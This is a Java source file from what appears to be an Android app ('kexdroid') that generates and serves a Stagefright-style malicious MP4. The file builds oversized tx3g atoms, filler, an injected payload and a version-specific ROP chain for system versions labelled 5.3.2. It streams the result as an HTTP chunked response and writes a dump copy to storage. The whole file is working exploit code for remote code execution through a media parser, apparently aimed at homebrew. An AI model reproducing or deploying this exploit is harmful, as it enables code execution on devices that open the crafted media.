package com.skettios.kexdroid;

import android.os.Environment;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

public class Stagefright
{
    public static boolean serveHax(OutputStream out, SystemVersions systemVersion, HTTPRequest header, String payloadName)
            throws Exception
    {
        int tx3gSize = 32768;

        if ((systemVersion == SystemVersions.EU_5_3_2) ||
                (systemVersion == SystemVersions.US_5_3_2) ||
                (systemVersion == SystemVersions.JP_5_3_2))
        {
            tx3gSize = 30720;
        }

        int tx3gRopStart = tx3gSize - 2048;

        int payloadSourceAddress = 341237032;

        ByteArrayOutputStream payloadSteam = new ByteArrayOutputStream();

        byte[] ropChain = RopChain.generate(payloadSourceAddress - 4096, systemVersion, payloadSourceAddress);

        Util.writeu32(24, payloadSteam);
        Util.writeu32(1718909296, payloadSteam);
        Util.writeu32(862416950, payloadSteam);
        Util.writeu32(256, payloadSteam);
        Util.writeu32(1769172845, payloadSteam);
        Util.writeu32(862409526, payloadSteam);

        Util.writeu32(tx3gSize + 4096, payloadSteam);
        Util.writeu32(1836019574, payloadSteam);

        Util.writeu32(108, payloadSteam);
        Util.writeu32(1677721600, payloadSteam);

        payloadSteam.write(Util.toArray("00000000C95B811AC95B811AFA0002580000022D000100000100000000000000000000000000FFFFF1000000000000000000000000010000000000000000000000000000400000000000000000000000000015696F6473000000001007004FFFFF2803FF"));

        Util.writeu32(tx3gSize + 2048, payloadSteam);
        Util.writeu32(1953653099, payloadSteam);

        Util.writeu32(92, payloadSteam);
        Util.writeu32(1953196132, payloadSteam);
        payloadSteam.write(Util.toArray("00000001C95B811AC95B811A00000001000000000000022D000000000000000000000000010000000001000000000000000800000000000000010000000000000000000000000000400000000000100000000000"));

        Util.writeu32(tx3gSize, payloadSteam);
        Util.writeu32(1954034535, payloadSteam);

        for (int i = 0; i < tx3gSize - 8; i += 4)
        {
            if (i < 24576)
            {
                if (i < 4096)
                {
                    Util.writeu32(1610612736, payloadSteam);
                }
                else if (i < 20480)
                {
                    byte[] payload = Payload.generatePayload(systemVersion, payloadName);
                    payloadSteam.write(payload);
                    i += payload.length - 4;
                    if (i + 4 >= 24576)
                    {
                        System.err.println("Payload to big!");
                        return false;
                    }

                    while (i + 4 < 20480)
                    {
                        Util.writeu32(-1869574000, payloadSteam);
                        i += 4;
                    }
                }
                else
                {
                    Util.writeu32(1482184792, payloadSteam);
                }
            }
            else if (i < tx3gRopStart)
            {
                Util.writeu32(systemVersion.getConstantInt("POPJUMPLR_STACK12"), payloadSteam);
            }
            else if (i == tx3gRopStart)
            {
                Util.writeu32(systemVersion.getConstantInt("POPJUMPLR_STACK12"), payloadSteam);
                Util.writeu32(1212696648, payloadSteam);
                i += 8;
                payloadSteam.write(ropChain);
                i += ropChain.length - 4;
            }
            else
            {
                Util.writeu32(1212696648, payloadSteam);
            }
        }

        Util.writeu32(453, payloadSteam);
        Util.writeu32(1835297121, payloadSteam);
        Util.writeu32(1, payloadSteam);
        Util.writeu32(1954034535, payloadSteam);
        Util.writeu32(1, payloadSteam);
        Util.writeu32((int) (4294967296L - tx3gSize), payloadSteam);

        for (int i = 0; i < 8192; i += 4)
        {
            Util.writeu32(-2070567244, payloadSteam);
        }

        byte[] payload = payloadSteam.toByteArray();
        out.write((Integer.toHexString(payload.length) + "\r\n").getBytes(StandardCharsets.US_ASCII));
        out.write(payload);
        out.write("\r\n0\r\n\r\n".getBytes(StandardCharsets.US_ASCII));

        File dumpFile = new File(Environment.getExternalStoragePublicDirectory("kexdroid") + "/dump/" + systemVersion.name() + "_" + payloadName + ".mp4");
        dumpFile.getParentFile().mkdirs();
        FileOutputStream fos = new FileOutputStream(dumpFile);
        fos.write(payload);
        fos.close();

        return true;
    }
}
